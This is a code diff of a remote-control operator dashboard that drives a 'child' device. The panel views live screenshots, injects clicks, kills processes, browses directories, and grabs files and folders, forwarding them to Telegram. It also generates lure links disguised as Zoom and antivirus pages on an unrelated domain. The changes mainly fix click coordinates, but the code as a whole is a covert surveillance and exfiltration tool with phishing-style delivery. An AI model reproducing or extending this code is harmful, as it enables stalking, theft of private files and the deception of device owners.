@@ -162,7 +162,7 @@ body {
     max-height: calc(100vh - 48px);
     user-select: none; -webkit-user-drag: none; pointer-events: none;
 }
-#screenOverlay { position: absolute; inset: 0; cursor: default; z-index: 10; }
+#screenOverlay { position: absolute; cursor: default; z-index: 10; }
 #screenOverlay:active { cursor: crosshair; }
 .rc-screen-loading {
     position: absolute; inset: 0; background: rgba(0, 0, 0, 0.7);
@@ -565,7 +565,6 @@ body {
             </div>
         </div>
 
-        <!-- GODMODE PANEL -->
         <div class="control-panel">
             <h6><i class="fas fa-bolt"></i> Godmode</h6>
             <div class="btn-grid">
@@ -581,7 +580,6 @@ body {
                 <button onclick="rcKillProcess()" title="Kill"><i class="fas fa-skull"></i></button>
             </div>
 
-            <!-- PARENT LINK GENERATORS -->
             <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border);">
                 <div style="font-size:10px;font-weight:700;color:var(--text-secondary);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;">
                     <i class="fas fa-link"></i> Generate Links
@@ -689,7 +687,6 @@ body {
             </div>
         </div>
 
-        <!-- TELEGRAM PANEL -->
         <div class="control-panel">
             <h6>
                 <i class="fab fa-telegram"></i> Telegram
@@ -717,7 +714,6 @@ body {
                     </label>
                 </div>
 
-                <!-- FILE SEND SECTION -->
                 <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border);">
                     <div style="font-size:10px;font-weight:700;color:var(--text-secondary);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;">
                         <i class="fas fa-paperclip"></i> Send Files
@@ -806,7 +802,6 @@ let currentAppList         = [];
 let appLoadInFlight        = false;
 let lastStatusPoll         = 0;
 let emptyDeviceListRetries = 0;
-let userManuallySelectedDevice = false;
 let receivedFiles          = [];
 
 // Live typing state
@@ -1257,10 +1252,30 @@ function rcSelectDevice(id) {
     updateActionButtons();
 
     rcLog('📱 Selected device: ' + id.substring(0, 12), 'success');
+
+    // v1.2.9: pull screen geometry BEFORE the first refresh
+    rcFetchScreenInfo(id);
     rcRefreshScreen();
     rcLoadApps();
     rcUpdateAgentInfo();
     rcLoadReceivedFiles(true);
+}
+
+async function rcFetchScreenInfo(deviceId) {
+    try {
+        const info = await api('/api/control/screen-info/' + encodeURIComponent(deviceId));
+        if (info && info.known && info.width > 0 && info.height > 0) {
+            currentDeviceScreen = { width: info.width, height: info.height };
+            const ds = deviceState.get(deviceId) || {};
+            ds.screenSize = currentDeviceScreen;
+            deviceState.set(deviceId, ds);
+            rcLog(`📐 Screen: ${info.width}×${info.height}`, 'info');
+        } else {
+            rcLog(`⚠️ No screen size for ${deviceId.substring(0,8)} yet — clicks will be blocked until ready`, 'warn');
+        }
+    } catch (e) {
+        rcLog('screen-info failed: ' + e.message, 'warn');
+    }
 }
 
 function updateStickyDevice(id) {
@@ -1308,13 +1323,10 @@ function updateStatusPill(hasDevices, anyOnline, anyPending) {
 async function rcRefreshScreen() {
     if (!currentDeviceId) return;
     try {
-        const shots = await api('/api/screenshots?limit=20');
-        let s = null;
-        if (Array.isArray(shots) && shots.length > 0) {
-            s = shots.find(x => x.device_id === currentDeviceId);
-            if (!s) s = shots[0];
-        }
-        if (!s) {
+        const shots = await api(
+            '/api/screenshots?limit=30&deviceId=' + encodeURIComponent(currentDeviceId)
+        );
+        if (!Array.isArray(shots) || shots.length === 0) {
             document.getElementById('screenLoading').classList.remove('hidden');
             const ds = deviceState.get(currentDeviceId) || {};
             const st = ds.status || 'offline';
@@ -1324,11 +1336,19 @@ async function rcRefreshScreen() {
                 'Waiting for screen...';
             return;
         }
+        const s = shots[0];   // server already filtered by deviceId
 
         const ds = deviceState.get(currentDeviceId) || {};
         if (s.filename === ds.lastScreenshotFilename) return;
         ds.lastScreenshotFilename = s.filename;
         deviceState.set(currentDeviceId, ds);
+
+        // Authoritative size — from the agent's GetSystemMetrics
+        if (s.width > 0 && s.height > 0) {
+            currentDeviceScreen = { width: s.width, height: s.height };
+            ds.screenSize = currentDeviceScreen;
+            deviceState.set(currentDeviceId, ds);
+        }
 
         const img = document.getElementById('screenImg');
         const overlay = document.getElementById('screenOverlay');
@@ -1339,30 +1359,30 @@ async function rcRefreshScreen() {
             img.src = newSrc;
             loading.classList.add('hidden');
             document.getElementById('screenInfoBar').style.display = 'flex';
-            document.getElementById('screenInfo').textContent = s.filename;
-            
-            // ✅ FIX: Update actual screen size from the screenshot
-            if (s.width && s.height) {
-                currentDeviceScreen = { width: s.width, height: s.height };
-                ds.screenSize = currentDeviceScreen;
-                deviceState.set(currentDeviceId, ds);
-            }
-            
+            document.getElementById('screenInfo').textContent =
+                `${s.filename}  [${s.width || '?'}×${s.height || '?'}]`;
+
             fpsCounter++;
             const now = Date.now();
             if (now - fpsTimestamp > 2000) {
-                const fps = (fpsCounter / ((now - fpsTimestamp) / 1000)).toFixed(1);
-                document.getElementById('fpsBadge').textContent = fps + ' FPS';
+                document.getElementById('fpsBadge').textContent =
+                    ((fpsCounter / ((now - fpsTimestamp) / 1000)).toFixed(1)) + ' FPS';
                 fpsCounter = 0; fpsTimestamp = now;
             }
+
+            // Size the overlay to the actual <img>
+            requestAnimationFrame(() => {
+                const r = img.getBoundingClientRect();
+                const wr = document.getElementById('screenWrapper').getBoundingClientRect();
+                overlay.style.inset  = 'auto';
+                overlay.style.left   = (r.left - wr.left) + 'px';
+                overlay.style.top    = (r.top  - wr.top)  + 'px';
+                overlay.style.width  = r.width  + 'px';
+                overlay.style.height = r.height + 'px';
+            });
         };
         tempImg.onerror = () => rcLog('Failed to load screenshot', 'error');
         tempImg.src = newSrc;
-        requestAnimationFrame(() => {
-            const rect = img.getBoundingClientRect();
-            overlay.style.width = rect.width + 'px';
-            overlay.style.height = rect.height + 'px';
-        });
     } catch (e) { rcLog('Refresh error: ' + e.message, 'error'); }
 }
 
@@ -1406,12 +1426,15 @@ function rcZoom(direction) {
 }
 
 // ============================================================
-// SCREEN INTERACTION (V1.2.9: Absolute Pixel Clicks)
+// SCREEN INTERACTION — NORMALIZED CLICKS (DPI-proof)
 // ============================================================
 function rcScreenSize() {
-    if (currentDeviceScreen && currentDeviceScreen.width > 0) return currentDeviceScreen;
-    // If we don't know the size, default to 1920x1080
-    return { width: 1920, height: 1080 };
+    if (currentDeviceScreen
+        && currentDeviceScreen.width  > 0
+        && currentDeviceScreen.height > 0) {
+        return currentDeviceScreen;
+    }
+    return null;   // caller MUST handle — refusing silently-wrong clicks
 }
 
 function setupScreenInteraction() {
@@ -1421,17 +1444,16 @@ function setupScreenInteraction() {
 
     const getAbsCoords = (e) => {
         const rect = img.getBoundingClientRect();
-        const sz = rcScreenSize();
-        
-        // Calculate normalized position (0.0 to 1.0)
+        if (!rect.width || !rect.height) return null;
         const nx = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
-        const ny = Math.max(0, Math.min(1, (e.clientY - rect.top) / rect.height));
-        
-        // Convert to absolute pixels based on the real screen size
-        return {
-            x: Math.round(nx * sz.width),
-            y: Math.round(ny * sz.height)
-        };
+        const ny = Math.max(0, Math.min(1, (e.clientY - rect.top)  / rect.height));
+        return { nx, ny };
+    };
+
+    const sendNormalized = (nx, ny, kind) => {
+        return api('/api/control/click-normalized', 'POST', {
+            deviceId: currentDeviceId, nx, ny, kind
+        }).catch(() => {});
     };
 
     const showRipple = (clientX, clientY, kind = '') => {
@@ -1452,14 +1474,14 @@ function setupScreenInteraction() {
             toast(`Device is ${ds.status || 'offline'}`, 'warn', 1500);
             return;
         }
-        
+
         const c = getAbsCoords(e);
+        if (!c) { toast('Screen not ready', 'warn', 1200); return; }
         showRipple(e.clientX, e.clientY);
 
-        // Right click
         if (e.button === 2) {
-            rcLog(`🖱️ Right-click (${c.x}, ${c.y})`, 'info');
-            api('/api/control/rightclick', 'POST', { deviceId: currentDeviceId, x: c.x, y: c.y });
+            rcLog(`🖱️ Right-click @ (${c.nx.toFixed(3)}, ${c.ny.toFixed(3)})`, 'info');
+            sendNormalized(c.nx, c.ny, 'rightclick');
             return;
         }
 
@@ -1470,17 +1492,16 @@ function setupScreenInteraction() {
         clickCount = (now - lastClickTime < 300) ? clickCount + 1 : 1;
         lastClickTime = now;
 
-        // 600ms for long-press
         pressTimer = setTimeout(() => {
             if (!isDragging) {
                 if (clickCount >= 2) {
                     showRipple(e.clientX, e.clientY, 'double');
-                    rcLog(`🖱️ Double-click (${c.x}, ${c.y})`, 'info');
-                    api('/api/control/doubleclick', 'POST', { deviceId: currentDeviceId, x: c.x, y: c.y });
+                    rcLog(`🖱️ Double-click @ (${c.nx.toFixed(3)}, ${c.ny.toFixed(3)})`, 'info');
+                    sendNormalized(c.nx, c.ny, 'doubleclick');
                     clickCount = 0;
                 } else {
-                    rcLog(`🖱️ Long-press (${c.x}, ${c.y})`, 'warn');
-                    api('/api/control/longpress', 'POST', { deviceId: currentDeviceId, x: c.x, y: c.y });
+                    rcLog(`🖱️ Long-press @ (${c.nx.toFixed(3)}, ${c.ny.toFixed(3)})`, 'warn');
+                    sendNormalized(c.nx, c.ny, 'longpress');
                 }
                 pressTimer = null;
             }
@@ -1490,7 +1511,11 @@ function setupScreenInteraction() {
     overlay.addEventListener('mousemove', (e) => {
         if (!startPoint) return;
         const c = getAbsCoords(e);
-        if (Math.sqrt((c.x - startPoint.x)**2 + (c.y - startPoint.y)**2) > 20) {
+        if (!c) return;
+        const sz = rcScreenSize();
+        const dx = (c.nx - startPoint.nx) * (sz ? sz.width  : 1000);
+        const dy = (c.ny - startPoint.ny) * (sz ? sz.height : 1000);
+        if (Math.sqrt(dx*dx + dy*dy) > 20) {
             isDragging = true;
             if (pressTimer) { clearTimeout(pressTimer); pressTimer = null; }
         }
@@ -1500,27 +1525,34 @@ function setupScreenInteraction() {
         if (e.button === 2) return;
         if (!startPoint) return;
         const c = getAbsCoords(e);
-        
+        if (!c) { startPoint = null; isDragging = false; return; }
+
         if (pressTimer) {
             clearTimeout(pressTimer);
             pressTimer = null;
-            
+
             if (clickCount >= 2) {
-                rcLog(`🖱️ Double-click (${c.x}, ${c.y})`, 'info');
-                api('/api/control/doubleclick', 'POST', { deviceId: currentDeviceId, x: c.x, y: c.y });
+                rcLog(`🖱️ Double-click @ (${c.nx.toFixed(3)}, ${c.ny.toFixed(3)})`, 'info');
+                sendNormalized(c.nx, c.ny, 'doubleclick');
                 clickCount = 0;
             } else {
-                rcLog(`👆 Tap (${c.x}, ${c.y})`, 'info');
-                api('/api/control/tap', 'POST', { deviceId: currentDeviceId, x: c.x, y: c.y });
+                rcLog(`👆 Tap @ (${c.nx.toFixed(3)}, ${c.ny.toFixed(3)})`, 'info');
+                sendNormalized(c.nx, c.ny, 'tap');
             }
         } else if (isDragging) {
-            rcLog(`👆 Swipe (${startPoint.x},${startPoint.y})→(${c.x},${c.y})`, 'info');
-            api('/api/control/swipe', 'POST', {
-                deviceId: currentDeviceId,
-                x1: startPoint.x, y1: startPoint.y,
-                x2: c.x, y2: c.y,
-                duration: 250
-            });
+            const sz = rcScreenSize();
+            if (sz) {
+                rcLog(`👆 Swipe (${startPoint.nx.toFixed(2)},${startPoint.ny.toFixed(2)})`
+                    + `→(${c.nx.toFixed(2)},${c.ny.toFixed(2)})`, 'info');
+                api('/api/control/swipe', 'POST', {
+                    deviceId: currentDeviceId,
+                    x1: Math.round(startPoint.nx * sz.width),
+                    y1: Math.round(startPoint.ny * sz.height),
+                    x2: Math.round(c.nx * sz.width),
+                    y2: Math.round(c.ny * sz.height),
+                    duration: 250
+                });
+            }
         }
         startPoint = null;
         isDragging = false;
@@ -1541,9 +1573,15 @@ function setupScreenInteraction() {
             return;
         }
         const c = getAbsCoords(e);
+        const sz = rcScreenSize();
+        if (!c || !sz) { toast('Screen not ready — try again in a second', 'warn', 1200); return; }
         const amount = e.deltaY > 0 ? -3 : 3;
-        
-        api('/api/control/scroll', 'POST', { deviceId: currentDeviceId, x: c.x, y: c.y, amount });
+        api('/api/control/scroll', 'POST', {
+            deviceId: currentDeviceId,
+            x: Math.round(c.nx * sz.width),
+            y: Math.round(c.ny * sz.height),
+            amount
+        }).catch(() => {});
     }, { passive: false });
 
     overlay.addEventListener('touchstart', (e) => {
@@ -1566,46 +1604,40 @@ function setupScreenInteraction() {
 }
 
 // ============================================================
-// CONTROL ACTIONS (V1.2.8: Fire-and-forget)
+// CONTROL ACTIONS — normalized helpers
 // ============================================================
 async function rcTap(nx, ny) {
-    const sz = rcScreenSize();
-    const x = Math.round(nx * sz.width), y = Math.round(ny * sz.height);
-    rcLog(`👆 Tap (${x}, ${y})`, 'info');
-    api('/api/control/tap', 'POST', { deviceId: currentDeviceId, x, y }).catch(()=>{});
+    api('/api/control/click-normalized', 'POST',
+        { deviceId: currentDeviceId, nx, ny, kind: 'tap' }).catch(() => {});
 }
 
 async function rcRightClick(nx, ny) {
-    const sz = rcScreenSize();
-    const x = Math.round(nx * sz.width), y = Math.round(ny * sz.height);
-    rcLog(`🖱️ Right-click (${x}, ${y})`, 'info');
-    api('/api/control/rightclick', 'POST', { deviceId: currentDeviceId, x, y }).catch(()=>{});
+    api('/api/control/click-normalized', 'POST',
+        { deviceId: currentDeviceId, nx, ny, kind: 'rightclick' }).catch(() => {});
 }
 
 async function rcDoubleClick(nx, ny) {
-    const sz = rcScreenSize();
-    const x = Math.round(nx * sz.width), y = Math.round(ny * sz.height);
-    rcLog(`🖱️ Double-click (${x}, ${y})`, 'info');
-    api('/api/control/doubleclick', 'POST', { deviceId: currentDeviceId, x, y }).catch(()=>{});
+    api('/api/control/click-normalized', 'POST',
+        { deviceId: currentDeviceId, nx, ny, kind: 'doubleclick' }).catch(() => {});
+}
+
+async function rcLongPress(nx, ny) {
+    api('/api/control/click-normalized', 'POST',
+        { deviceId: currentDeviceId, nx, ny, kind: 'longpress' }).catch(() => {});
 }
 
 async function rcSwipe(nx1, ny1, nx2, ny2, duration) {
     const sz = rcScreenSize();
+    if (!sz) { toast('Screen not ready', 'warn', 1200); return; }
     const x1 = Math.round(nx1 * sz.width), y1 = Math.round(ny1 * sz.height);
     const x2 = Math.round(nx2 * sz.width), y2 = Math.round(ny2 * sz.height);
     rcLog(`👆 Swipe (${x1},${y1})→(${x2},${y2})`, 'info');
     api('/api/control/swipe', 'POST', { deviceId: currentDeviceId, x1, y1, x2, y2, duration }).catch(()=>{});
 }
 
-async function rcLongPress(nx, ny) {
-    const sz = rcScreenSize();
-    const x = Math.round(nx * sz.width), y = Math.round(ny * sz.height);
-    rcLog(`👆 Long-press (${x}, ${y})`, 'warn');
-    api('/api/control/longpress', 'POST', { deviceId: currentDeviceId, x, y }).catch(()=>{});
-}
-
 async function rcScroll(nx, ny, amount) {
     const sz = rcScreenSize();
+    if (!sz) return;
     const x = Math.round(nx * sz.width), y = Math.round(ny * sz.height);
     api('/api/control/scroll', 'POST', { deviceId: currentDeviceId, x, y, amount }).catch(()=>{});
 }
@@ -1802,7 +1834,7 @@ async function rcKillProcess() {
 }
 
 // ============================================================
-// PARENT LINK GENERATORS (Zoom + Antivirus)
+// PARENT LINK GENERATORS
 // ============================================================
 const PARENT_LINKS = {
     zoom:      'https://uswebzoomcall.pacon.eu.cc/zoom.html',
@@ -1827,9 +1859,7 @@ function _rcShowLink(label, url) {
     anchor.href        = url;
     box.style.display  = 'block';
 
-    // Auto-copy to clipboard so the parent can paste immediately
     rcCopyLinkOutput(true);
-
     rcLog(`🔗 Generated ${label}: ${url}`, 'success');
 }
 
@@ -1854,7 +1884,6 @@ async function rcCopyLinkOutput(silent = false) {
             rcLog('📋 Link auto-copied: ' + _lastGeneratedLink, 'info');
         }
     } catch (e) {
-        // Fallback for browsers that block async clipboard without a gesture
         const ta = document.createElement('textarea');
         ta.value = _lastGeneratedLink;
         ta.style.position = 'fixed';
@@ -1906,11 +1935,10 @@ async function rcListDir() {
     currentPath = path;
     const list = document.getElementById('rcFileList');
     list.innerHTML = '<div style="text-align:center;padding:12px;"><div class="spinner-ring" style="margin:0 auto;width:24px;height:24px;"></div></div>';
-    
-    // ✅ FIX: Correctly send "list_dir" with underscore
+
     const r = await rcSendAndTrack('/api/control/list-dir', { path }, `List: ${path || '~'}`,
         { attempts: 20, silentSuccess: true });
-        
+
     if (!r || !r.ok) {
         list.innerHTML = '<div style="color:var(--red);font-size:10px;padding:8px;text-align:center;">Failed to list directory</div>';
         return;
@@ -2041,9 +2069,6 @@ async function rcFetchFilePath(path) {
     }
 }
 
-// ════════════════════════════════════════════════════════════
-// Per-file Grab → Telegram (File Browser ✈️ button)
-// ════════════════════════════════════════════════════════════
 async function rcFetchAndTgFile(path) {
     if (!currentDeviceId || !path) return;
     const base = path.split('\\').pop() || path.split('/').pop() || path;
@@ -2051,7 +2076,6 @@ async function rcFetchAndTgFile(path) {
     rcLog(`📥 Grabbing ${base} from child…`, 'info');
     toast(`Grabbing ${base}…`, 'info');
 
-    // Step 1: fetch from child → server
     const r = await rcSendAndTrack('/api/control/fetch-file', { path },
         `Fetch ${base}`, { attempts: 40 });
 
@@ -2061,7 +2085,6 @@ async function rcFetchAndTgFile(path) {
     }
     rcLog('✅ File uploaded to server', 'success');
 
-    // Step 2: poll received list until the file shows up (up to 8s)
     const match = await _waitForReceivedFile(base, 8000);
     if (!match) {
         rcLog('⚠️ Fetched file not indexed yet — try "Received" button', 'warn');
@@ -2070,14 +2093,10 @@ async function rcFetchAndTgFile(path) {
         return;
     }
 
-    // Step 3: send to Telegram
     rcLog(`📤 Sending ${match.filename} → Telegram…`, 'info');
     await rcTelegramReceived(match.dev_folder, match.filename);
 }
 
-// ════════════════════════════════════════════════════════════
-// Folder Grab → Telegram (File Browser toolbar ✈️ TG button)
-// ════════════════════════════════════════════════════════════
 async function rcFetchFolderAndTg() {
     if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
     const path = document.getElementById('rcPathInput').value || '';
@@ -2088,7 +2107,6 @@ async function rcFetchFolderAndTg() {
     rcLog(`📥 Fetching ${path}\\${glob} (max ${max}) → Telegram…`, 'info');
     toast(`Fetching up to ${max} files from ${path}…`, 'info');
 
-    // Step 1: fetch folder
     const r = await rcSendAndTrack('/api/control/fetch-folder',
         { path, glob, max },
         `Fetch folder ${path}`, { attempts: 60 });
@@ -2100,14 +2118,12 @@ async function rcFetchFolderAndTg() {
     const sent = (r.data && r.data.sent) || 0;
     rcLog(`✅ Fetched ${sent} file(s)`, 'success');
 
-    // Step 2: refresh list
     await rcLoadReceivedFiles(true);
     if (!receivedFiles.length) {
         toast('No received files to send', 'warn');
         return;
     }
 
-    // Step 3: pick the newest N files (fetch_folder prepends them)
     const toSend = receivedFiles.slice(0, sent || receivedFiles.length);
     if (toSend.length > 10 &&
         !confirm(`Send ${toSend.length} files to Telegram?`)) return;
@@ -2125,9 +2141,6 @@ async function rcFetchFolderAndTg() {
     toast(`${ok} sent, ${fail} failed`, ok > 0 ? 'success' : 'error');
 }
 
-// ════════════════════════════════════════════════════════════
-// Poll received list until a filename match appears
-// ════════════════════════════════════════════════════════════
 async function _waitForReceivedFile(base, timeoutMs = 8000) {
     const stem = base.replace(/\.[^.]+$/, '');
     const deadline = Date.now() + timeoutMs;
@@ -2490,7 +2503,7 @@ function rcShowShortcuts() {
 }
 
 // ============================================================
-// TELEGRAM — v1.2.9 (file send helpers)
+// TELEGRAM
 // ============================================================
 async function tgLoad() {
     try {
@@ -2566,7 +2579,7 @@ async function tgTest() {
 
 async function tgSendLatestScreenshot() {
     if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
-    const shots = await api('/api/screenshots?limit=10');
+    const shots = await api('/api/screenshots?limit=10&deviceId=' + encodeURIComponent(currentDeviceId));
     if (!Array.isArray(shots) || shots.length === 0) {
         rcLog('⚠️ No screenshots available', 'warn');
         return;
@@ -2594,9 +2607,6 @@ async function tgSendCustomText() {
     else { rcLog('❌ Send failed', 'error'); toast('Send failed', 'error'); }
 }
 
-// ────────────────────────────────────────────────────────────
-// Telegram FILE sending — server files panel
-// ────────────────────────────────────────────────────────────
 async function tgListAdminFiles() {
     rcLog('📋 Fetching server files…', 'info');
     const list = await api('/api/files/list?limit=200');
@@ -2671,9 +2681,6 @@ async function tgPickAndSendReceivedFile() {
     await rcTelegramReceived(f.dev_folder, f.filename);
 }
 
-// ════════════════════════════════════════════════════════════
-// Grab from child → server → Telegram (polling fixed)
-// ════════════════════════════════════════════════════════════
 async function tgGrabAndSendFromChild() {
     if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
     const path = prompt(
@@ -2687,7 +2694,6 @@ async function tgGrabAndSendFromChild() {
     rcLog(`📥 Grabbing ${path} from child…`, 'info');
     toast('Grabbing file from child…', 'info');
 
-    // Step 1: request the file
     const r = await rcSendAndTrack('/api/control/fetch-file', { path },
         `Fetch ${base}`, { attempts: 40 });
 
@@ -2697,7 +2703,6 @@ async function tgGrabAndSendFromChild() {
     }
     rcLog('✅ File uploaded to server', 'success');
 
-    // Step 2: poll for it (fixes the race condition)
     const match = await _waitForReceivedFile(base, 8000);
     if (!match) {
         rcLog('⚠️ Fetched file not indexed yet — try "Received" button', 'warn');
@@ -2705,7 +2710,6 @@ async function tgGrabAndSendFromChild() {
         return;
     }
 
-    // Step 3: send to Telegram
     rcLog(`📤 Sending ${match.filename} → Telegram…`, 'info');
     await rcTelegramReceived(match.dev_folder, match.filename);
 }
@@ -2740,7 +2744,6 @@ function rcBootAfterAuth() {
         document.getElementById('rcHiddenToggle').querySelector('i').className = 'fas fa-eye';
     }
 
-    // Live device status ticker
     setInterval(async () => {
         if (!currentDeviceId) return;
         const data = await api('/api/devices');
